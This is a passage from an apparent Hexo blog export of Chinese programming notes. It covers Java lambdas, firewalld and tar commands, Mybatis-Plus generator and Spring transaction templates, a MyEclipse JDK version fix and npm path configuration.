class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;我喜欢lambda5&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.用Lambda简化（接口必须是函数式接口）</span></span><br><span class="line">        like = () -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda6&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        like.lambda();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>函数式接口</tag>
        <tag>lambda表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux防火墙相关命令</title>
    <url>/2023/01/07/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="Linux防火墙相关命令"><a href="#Linux防火墙相关命令" class="headerlink" title="Linux防火墙相关命令"></a>Linux防火墙相关命令</h2><span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启</span></span><br><span class="line">service firewalld start</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">service firewalld restart</span><br><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">service firewalld stop</span><br><span class="line"><span class="comment"># 查看防火墙规则</span></span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"><span class="comment"># 查看端口是否开放</span></span><br><span class="line">firewall-cmd --query-port=8080/tcp</span><br><span class="line"><span class="comment"># 开放80端口</span></span><br><span class="line">firewall-cmd --permanent --add-port=80/tcp</span><br><span class="line"><span class="comment"># 移除端口</span></span><br><span class="line">firewall-cmd --permanent --remove-port=8080/tcp</span><br><span class="line"><span class="comment"># 重启防火墙（修改配置后要重启防火墙）</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="comment"># 参数解释</span></span><br><span class="line">firewall-cmd：是Linux提供的操作firewall的一个工具</span><br><span class="line">--permanent：表示设置为持久</span><br><span class="line">--add-port：标识添加的端口 </span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：在开放、移除端口操作之后，并不会立即生效（因为这两个命令仅是修改了配置文件的内容，若要生效，还需要执行重启的命令，来重新读取防火墙的配置文件）</p>
</blockquote>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux解、压缩命令</title>
    <url>/2022/12/31/Linux%E8%A7%A3%E3%80%81%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="内置tar命令"><a href="#内置tar命令" class="headerlink" title="内置tar命令"></a>内置tar命令</h2><span id="more"></span>

<p>linux压缩命令一般可用tar命令，因为tar属于linux系统内置的命令，所以无需额外安装直接可用。</p>
<h3 id="tar命令参数说明"><a href="#tar命令参数说明" class="headerlink" title="tar命令参数说明"></a>tar命令参数说明</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-c: 建立压缩档案</span><br><span class="line">-x：解压</span><br><span class="line">-t：查看内容</span><br><span class="line">-r：向压缩归档文件末尾追加文件</span><br><span class="line">-u：更新原压缩包中的文件</span><br><span class="line"></span><br><span class="line">以上5个是独立的命令，压缩解压都要用到其中1个，可以和别的命令连用但只能用其中1个。</span><br></pre></td></tr></table></figure>

<h3 id="下面的参数是根据需要在压缩或解压档案时可选的"><a href="#下面的参数是根据需要在压缩或解压档案时可选的" class="headerlink" title="下面的参数是根据需要在压缩或解压档案时可选的"></a>下面的参数是根据需要在压缩或解压档案时可选的</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-z：有gzip属性的</span><br><span class="line">-j：有bz2属性的</span><br><span class="line">-Z：有compress属性的</span><br><span class="line">-v：显示所有过程</span><br><span class="line">-O：将文件解开到标准输出 </span><br></pre></td></tr></table></figure>

<h3 id="下面的参数-f是必须的："><a href="#下面的参数-f是必须的：" class="headerlink" title="下面的参数-f是必须的："></a>下面的参数-f是必须的：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f: 使用档案名字，这个参数要放在最后，后面只能接档案名（文件名）。</span><br></pre></td></tr></table></figure>
<p>另外，linux的压缩命令可用的还有zip、rar、7z等等，但一般要先进行安装对应的软件。</p>
<h2 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a>常用示例</h2><h3 id="tar-打包压缩文件命令："><a href="#tar-打包压缩文件命令：" class="headerlink" title="tar 打包压缩文件命令："></a>tar 打包压缩文件命令：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zcvf test.zip.tar  test.png</span><br></pre></td></tr></table></figure>

<h3 id="tar-打包压缩文件夹命令："><a href="#tar-打包压缩文件夹命令：" class="headerlink" title="tar 打包压缩文件夹命令："></a>tar 打包压缩文件夹命令：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zcvf test.zip.tar  test&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="tar-压缩文件解压："><a href="#tar-压缩文件解压：" class="headerlink" title="tar 压缩文件解压："></a>tar 压缩文件解压：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zxvf test.zip.tar</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis-Plus-Generate模板</title>
    <url>/2024/05/13/Mybatis-Plus-Generate%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="Mybatis-Plus-Generate配置模板"><a href="#Mybatis-Plus-Generate配置模板" class="headerlink" title="Mybatis-Plus-Generate配置模板"></a>Mybatis-Plus-Generate配置模板</h2><span id="more"></span>

<h3 id="新版本（3-5-1-及其以上版本）"><a href="#新版本（3-5-1-及其以上版本）" class="headerlink" title="新版本（3.5.1 及其以上版本）"></a>新版本（3.5.1 及其以上版本）</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><pre><code>&lt;!--mybatis-plus 是自己开发的，并非官方--&gt;
&lt;!--尽量不要同时导入mybatis-plus和mybatis--&gt;

&lt;!--mybatis-plus--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.baomidou&lt;/groupId&gt;
    &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;
    &lt;version&gt;3.5.2&lt;/version&gt;
&lt;/dependency&gt;

&lt;!--mybatis-plus-generate尽量和mybatis-plus版本保持一致--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.baomidou&lt;/groupId&gt;
    &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt;
    &lt;version&gt;3.5.3.1&lt;/version&gt;
&lt;/dependency&gt;

&lt;!--freemarker模板引擎依赖--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.freemarker&lt;/groupId&gt;
    &lt;artifactId&gt;freemarker&lt;/artifactId&gt;
    &lt;version&gt;2.3.31&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<h4 id="Java代码"><a href="#Java代码" class="headerlink" title="Java代码"></a>Java代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    新版本（mybatis-plus-generator 3.5.1 及其以上版本，不向前兼容）代码生成器写法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    String projectPath = System.getProperty(<span class="string">&quot;user.dir&quot;</span>);    <span class="comment">// 获取项目路径，用于后面的目录位置</span></span><br><span class="line"></span><br><span class="line">    FastAutoGenerator.create(<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis_plus?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=GMT%2b8&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;13579lry&quot;</span>)</span><br><span class="line">            <span class="comment">// 全局配置</span></span><br><span class="line">            .globalConfig(builder -&gt; &#123;</span><br><span class="line">                builder.author(<span class="string">&quot;lry&quot;</span>) <span class="comment">// 设置作者</span></span><br><span class="line">                        .enableSwagger() <span class="comment">// 开启 swagger 模式</span></span><br><span class="line">                        <span class="comment">// .fileOverride() // 覆盖已生成文件</span></span><br><span class="line">                        .disableOpenDir()</span><br><span class="line">                        .outputDir(projectPath + <span class="string">&quot;/src/main/java&quot;</span>) <span class="comment">// 指定代码输出目录</span></span><br><span class="line">                        .dateType(DateType.ONLY_DATE)       <span class="comment">// 日期的类型，仅是时间</span></span><br><span class="line">                        .enableSwagger();</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="comment">// 设置数据源</span></span><br><span class="line">            .dataSourceConfig(builder -&gt; builder.typeConvertHandler((globalConfig, typeRegistry, metaInfo) -&gt; &#123;</span><br><span class="line">                <span class="keyword">int</span> typeCode = metaInfo.getJdbcType().TYPE_CODE;</span><br><span class="line">                <span class="keyword">if</span> (typeCode == Types.SMALLINT) &#123;</span><br><span class="line">                    <span class="comment">// 自定义类型转换</span></span><br><span class="line">                    <span class="keyword">return</span> DbColumnType.INTEGER;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> typeRegistry.getColumnType(metaInfo);</span><br><span class="line">            &#125;))</span><br><span class="line">            .packageConfig(builder -&gt; &#123;</span><br><span class="line">                builder.parent(<span class="string">&quot;com.lry&quot;</span>) <span class="comment">// 设置父包名</span></span><br><span class="line">                        .moduleName(<span class="string">&quot;mybatisplus&quot;</span>) <span class="comment">// 设置父包模块名，默认值无</span></span><br><span class="line">                        .entity(<span class="string">&quot;entity&quot;</span>)</span><br><span class="line">                        .mapper(<span class="string">&quot;mapper&quot;</span>)</span><br><span class="line">                        .service(<span class="string">&quot;service&quot;</span>)</span><br><span class="line">                        .serviceImpl(<span class="string">&quot;service.impl&quot;</span>)</span><br><span class="line">                        .controller(<span class="string">&quot;controller&quot;</span>)</span><br><span class="line">                        .pathInfo(Collections.singletonMap(OutputFile.xml, projectPath + <span class="string">&quot;\\src\\main\\resources\\mapper&quot;</span>)); <span class="comment">// 设置mapperXml生成路径</span></span><br><span class="line">            &#125;)</span><br><span class="line">            .strategyConfig(builder -&gt; &#123;</span><br><span class="line">                builder.addInclude(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;user2&quot;</span>) <span class="comment">// 设置需要生成的表名</span></span><br><span class="line">                        .addTablePrefix(<span class="string">&quot;t_&quot;</span>, <span class="string">&quot;c_&quot;</span>) <span class="comment">// 设置过滤表前缀</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// Entity策略配置</span></span><br><span class="line">                        .entityBuilder()</span><br><span class="line">                        .enableLombok()    <span class="comment">// 自动Lombok</span></span><br><span class="line">                        .naming(NamingStrategy.underline_to_camel)      <span class="comment">// 数据库表映射到实体的命名策略</span></span><br><span class="line">                        .columnNaming(NamingStrategy.underline_to_camel)   <span class="comment">// 数据库表字段映射到实体的命名策略：内置下划线转驼峰命名</span></span><br><span class="line">                        .logicDeleteColumnName(<span class="string">&quot;deleted&quot;</span>)   <span class="comment">// 逻辑删除字段名(数据库字段)，logicDeleteColumnName与logicDeletePropertyName二选一即可</span></span><br><span class="line">                        .addTableFills(<span class="keyword">new</span> Column(<span class="string">&quot;create_time&quot;</span>, FieldFill.INSERT))         <span class="comment">// 自动填充策略</span></span><br><span class="line">                        .addTableFills(<span class="keyword">new</span> Property(<span class="string">&quot;update_time&quot;</span>, FieldFill.INSERT))         <span class="comment">// 自动填充策略，两个作用一样，可见其源码</span></span><br><span class="line">                        .versionColumnName(<span class="string">&quot;version&quot;</span>)     <span class="comment">// 乐观锁数据库字段名称</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// Controlelr策略配置</span></span><br><span class="line">                        .controllerBuilder()</span><br><span class="line">                        .enableRestStyle();     <span class="comment">// 开启生成@RestController控制器</span></span><br><span class="line">                <span class="comment">// .enableHyphenStyle();   // 开启驼峰转连字符</span></span><br><span class="line">            &#125;)</span><br><span class="line">            .templateEngine(<span class="keyword">new</span> FreemarkerTemplateEngine()) <span class="comment">// 使用Freemarker引擎模板，默认的是Velocity引擎模板</span></span><br><span class="line">            <span class="comment">// .templateEngine() // 使用Freemarker引擎模板，默认的是Velocity引擎模板</span></span><br><span class="line">            .execute();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="旧版本"><a href="#旧版本" class="headerlink" title="旧版本"></a>旧版本</h3><h4 id="Java代码-1"><a href="#Java代码-1" class="headerlink" title="Java代码"></a>Java代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    旧版本代码生成器写法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 需要构建一个 代码自动生成器 对象</span></span><br><span class="line">     AutoGenerator mpg = <span class="keyword">new</span> AutoGenerator();</span><br><span class="line">     <span class="comment">// 配置策略</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">// 1、全局配置</span></span><br><span class="line">     GlobalConfig gc = <span class="keyword">new</span> GlobalConfig();</span><br><span class="line">     String projectPath = System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">     gc.setOutputDir(projectPath + <span class="string">&quot;/src/main/java&quot;</span>);</span><br><span class="line">     gc.setAuthor(<span class="string">&quot;小爽帅到拖网速&quot;</span>);</span><br><span class="line">     gc.setOpen(<span class="keyword">false</span>);</span><br><span class="line">     gc.setFileOverride(<span class="keyword">false</span>);  <span class="comment">// 是否覆盖</span></span><br><span class="line">     gc.setServiceName(<span class="string">&quot;%Serive&quot;</span>); <span class="comment">// 服务接口，去Service的I前缀</span></span><br><span class="line">     gc.setIdType(IdType.ID_WORKER); <span class="comment">// 主键生成策略</span></span><br><span class="line">     gc.setDateType(DateType.ONLY_DATE);</span><br><span class="line">     gc.setSwagger2(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 给代码自动生成器注入配置</span></span><br><span class="line">     mpg.setGlobalConfig(gc);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 2、 设置数据源</span></span><br><span class="line">     DataSourceConfig dsc = <span class="keyword">new</span> DataSourceConfig();</span><br><span class="line">     dsc.setUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis_plus?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=GMT%2b8&quot;</span>);</span><br><span class="line">     dsc.setDriverName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">     dsc.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">     dsc.setPassword(<span class="string">&quot;83821979Zs&quot;</span>);</span><br><span class="line">     dsc.setDbType(DbType.MYSQL);</span><br><span class="line">     mpg.setDataSource(dsc);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 3、包的配置</span></span><br><span class="line"></span><br><span class="line">     PackageConfig pc = <span class="keyword">new</span> PackageConfig();</span><br><span class="line">     pc.setModuleName(<span class="string">&quot;blog&quot;</span>);</span><br><span class="line">     pc.setParent(<span class="string">&quot;com.shuang&quot;</span>);</span><br><span class="line">     pc.setEntity(<span class="string">&quot;entity&quot;</span>);</span><br><span class="line">     pc.setMapper(<span class="string">&quot;mapper&quot;</span>);</span><br><span class="line">     pc.setService(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">     pc.setController(<span class="string">&quot;controller&quot;</span>);</span><br><span class="line"></span><br><span class="line">     mpg.setPackageInfo(pc);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 4、策略配置</span></span><br><span class="line">     StrategyConfig strategy = <span class="keyword">new</span> StrategyConfig();</span><br><span class="line">     strategy.setInclude(<span class="string">&quot;user&quot;</span>); <span class="comment">// 设置要映射的表名</span></span><br><span class="line">     strategy.setNaming(NamingStrategy.underline_to_camel);  <span class="comment">// 内置下划线转驼峰命名</span></span><br><span class="line">     strategy.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">     strategy.setEntityLombokModel(<span class="keyword">true</span>);  <span class="comment">// 自动Lombok</span></span><br><span class="line"></span><br><span class="line">     strategy.setLogicDeleteFieldName(<span class="string">&quot;deleted&quot;</span>);  <span class="comment">// 逻辑删除字段</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">// 自动填充策略</span></span><br><span class="line">     TableFill gmtCreate = <span class="keyword">new</span> TableFill(<span class="string">&quot;gmt_create&quot;</span>, FieldFill.INSERT);</span><br><span class="line">     TableFill gmtModifid = <span class="keyword">new</span> TableFill(<span class="string">&quot;gmt_modifid&quot;</span>, FieldFill.INSERT);</span><br><span class="line"></span><br><span class="line">     ArrayList&lt;TableFill&gt; tableFills = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">     tableFills.add(gmtCreate);</span><br><span class="line">     tableFills.add(gmtModifid);</span><br><span class="line">     strategy.setTableFillList(tableFills);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 乐观锁</span></span><br><span class="line">     strategy.setVersionFieldName(<span class="string">&quot;version&quot;</span>);</span><br><span class="line"></span><br><span class="line">     strategy.setRestControllerStyle(<span class="keyword">true</span>);</span><br><span class="line">     strategy.setControllerMappingHyphenStyle(<span class="keyword">true</span>); <span class="comment">// Localhost:8080/hello_id_2</span></span><br><span class="line"></span><br><span class="line">     mpg.setStrategy(strategy);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 执行</span></span><br><span class="line">     mpg.execute();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
      </tags>
  </entry>
  <entry>
    <title>MyEclipse——jdk版本不支持</title>
    <url>/2021/05/29/MyEclipse%E2%80%94%E2%80%94jdk%E7%89%88%E6%9C%AC%E4%B8%8D%E6%94%AF%E6%8C%81/</url>
    <content><![CDATA[<h2 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h2><span id="more"></span>

<ul>
<li>在计算机中执行生成jar文件也会出现和本文中讨论的问题一样的错误，两种情况的原因是一样的，其解决方法可以参考我的另一篇文章：<a href="https://liu-ruyang.github.io/2021/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%89%A7%E8%A1%8C%E6%89%80%E7%94%9F%E6%88%90%E7%9A%84jar%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99%E2%80%94%E2%80%94%E7%89%88%E6%9C%AC%E4%B8%8D%E6%94%AF%E6%8C%81/">计算机执行所生成的jar文件报错：版本不支持</a></li>
</ul>
<h2 id="报错信息——java-lang-UnsupportedClassVersionError"><a href="#报错信息——java-lang-UnsupportedClassVersionError" class="headerlink" title="报错信息——java.lang.UnsupportedClassVersionError"></a>报错信息——java.lang.UnsupportedClassVersionError</h2><h3 id="在编译运行的时候报如下的错误"><a href="#在编译运行的时候报如下的错误" class="headerlink" title="在编译运行的时候报如下的错误"></a>在编译运行的时候报如下的错误</h3><pre><code>错误: 加载主类 Test 时出现 LinkageError
java.lang.UnsupportedClassVersionError: Test has been compiled by a more recent version of the Java Runtime (class file version 58.0), this
version of the Java Runtime only recognizes class file versions up to 55.0
</code></pre>
<p><img src="https://i.loli.net/2021/05/29/IlKuxRMXBepzTQq.png" alt="屏幕截图 2021-05-29 145337.png"></p>
<p>放大看错误</p>
<p><img src="https://i.loli.net/2021/05/29/Y1OJycCIPq8aHAK.png" alt="屏幕截图 2021-05-29 145604.png"></p>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p><strong>这是因为MyEclipse所设置支持的编译器的版本和自己本项目所使用的jdk版本不同，需要手动改一下（二者随便改哪一个都行，目标都是改成一致的）</strong></p>
<h3 id="解决办法①：查看、修改jdk版本"><a href="#解决办法①：查看、修改jdk版本" class="headerlink" title="解决办法①：查看、修改jdk版本"></a>解决办法①：查看、修改jdk版本</h3><p>例如：本人所使用的jdk版本是<strong>jdk11</strong></p>
<p>修改jdk版本方法如下：</p>
<p>①依次点击：<strong>Window - preference - java - installed JREs - add</strong>，出现下面界面（初始时列表里只有一个jdk版本的（即只有第一行那个））</p>
<p><img src="https://i.loli.net/2021/05/29/BRp4XsO6WTI51mJ.png" alt="屏幕截图 2021-05-29 150338.png"></p>
<p>②选择<strong>Standard VM</strong>，点击 <strong>Directory（选择自己的jdk）- 输入JRE name（随意）- Finish</strong></p>
<p><img src="https://i.loli.net/2021/05/29/wHCYGEOyL8kvanZ.png" alt="屏幕截图 2021-05-29 150415.png"></p>
<p><img src="https://i.loli.net/2021/05/29/FrywNIpWDX3mPeM.png" alt="屏幕截图 2021-05-29 150622.png"></p>
<p>③勾选自己添加的jdk，然后点击Apply，然后结束。</p>
<p><img src="https://i.loli.net/2021/05/29/XSBMowaq8DrLfEd.png" alt="屏幕截图 2021-05-29 150722.png"></p>
<h3 id="解决方法②：查看、修改eclipse选择支持使用的编译器版本"><a href="#解决方法②：查看、修改eclipse选择支持使用的编译器版本" class="headerlink" title="解决方法②：查看、修改eclipse选择支持使用的编译器版本"></a>解决方法②：查看、修改eclipse选择支持使用的编译器版本</h3><p>①依次点击：<strong>Window - preference - java - Compiler</strong></p>
<p><img src="https://i.loli.net/2021/05/29/LI6VqRWouS5QKkT.png" alt="屏幕截图 2021-05-29 152127.png"></p>
<p>②将编译器版本改为自己想要使用的版本（与上面设置的那个版本相同就行了），点击Apply应用结束</p>
<h3 id="修改效果"><a href="#修改效果" class="headerlink" title="修改效果"></a>修改效果</h3><p>编译运行成功</p>
<p><img src="https://i.loli.net/2021/05/29/ETzhQY87PFvcbfO.png" alt="屏幕截图 2021-05-29 152341.png"></p>
]]></content>
  </entry>
  <entry>
    <title>Mybatis-Spring的事务配置模板</title>
    <url>/2021/11/06/Mybatis-Spring%E7%9A%84%E4%BA%8B%E5%8A%A1%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="Mybatis-Spring的事务配置模板"><a href="#Mybatis-Spring的事务配置模板" class="headerlink" title="Mybatis-Spring的事务配置模板"></a>Mybatis-Spring的事务配置模板</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--1、配置声明式事务--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--结合AOP实现事务的织入--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置事务的类--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;transactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置哪些方法使用什么样的事务,配置事务的传播特性--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;addUser&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;deleteUser&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;selectUserList&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--2、AOP配置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;txPointCut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.lry.mapper.UserMapperImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;txPointCut&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>Mybatis-Spring</tag>
        <tag>事务</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis的Mapper的xml模板</title>
    <url>/2021/11/06/Mybatis%E7%9A%84Mapper%E7%9A%84xml%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="Mybatis的mapper-xml配置模板"><a href="#Mybatis的mapper-xml配置模板" class="headerlink" title="Mybatis的mapper.xml配置模板"></a>Mybatis的mapper.xml配置模板</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>Mybatis</tag>
        <tag>Mapper.xml</tag>
      </tags>
  </entry>
  <entry>
    <title>Node和npm的配置</title>
    <url>/2022/04/24/Node%E5%92%8Cnpm%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="配置下载地址和命令、依赖引用路径"><a href="#配置下载地址和命令、依赖引用路径" class="headerlink" title="配置下载地址和命令、依赖引用路径"></a>配置下载地址和命令、依赖引用路径</h2><span id="more"></span>

<p>在这个过程中，要注意有三种路径：<strong>①安装路径   ②命令路径   ③依赖包路径</strong></p>
<p><strong>①安装路径：</strong>即npm安装工具的时候的安装路径，通过cmd中的命令设置</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> prefix &quot;D:\Develop\nodejs\node_global&quot;	//设置npm全局下载的位置</span><br><span class="line">npm config <span class="built_in">set</span> cache &quot;D:\Develop\nodejs\node_cache&quot;		//设置npm下载时的缓存的位置</span><br></pre></td></tr></table></figure>

<p><strong>②命令路径：</strong>即npm下载完工具后，在需要引用这些工具的某些命令的时候的路径；在环境变量中修改命令的路径（需要添加到Path中）</p>
<p><strong>③依赖包路径：</strong>在npm下载完工具后，除了第二种命令存在于一个地方，还会经相关的依赖包也单独放到一个node_module路径中；寻找这些依赖包，通过在环境变量中添加环境变量，命名为<strong>NODE_PATH（固定）</strong>，地址为node_global下的node_modules（不需要添加在Path中）</p>
<blockquote>
<p>①但是，如果是在项目中打开，则会自动从当前盘中逐层寻找依赖（即不需要通过添加环境变量）<br>②换一种说法，这个环境变量为了能够让在不同位置的项目使用同一个的依赖（即全局下载的）</p>
</blockquote>
<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p><strong>①“使用命令”：</strong>一般要能在终端中使用命令，则需要将命令所在的文件夹路径<strong>添加到环境变量Path中</strong><br><strong>②“引用依赖”：</strong>一般要使用一些文件夹下的依赖包，往往需要在环境变量中添加一些<strong>指定的变量名</strong>，地址为依赖包所在的文件夹（<strong>不需要添加到Path中</strong>）</p>
]]></content>
      <tags>
        <tag>本地命令使用</tag>
        <tag>本地依赖引用</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis的核心配置模板</title>
    <url>/2021/11/06/Mybatis%E7%9A%84%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="Mybatis的mybatis-config-xml配置模板"><a href="#Mybatis的mybatis-config-xml配置模板" class="headerlink" title="Mybatis的mybatis-config.xml配置模板"></a>Mybatis的mybatis-config.xml配置模板</h2><span id="more"></span>

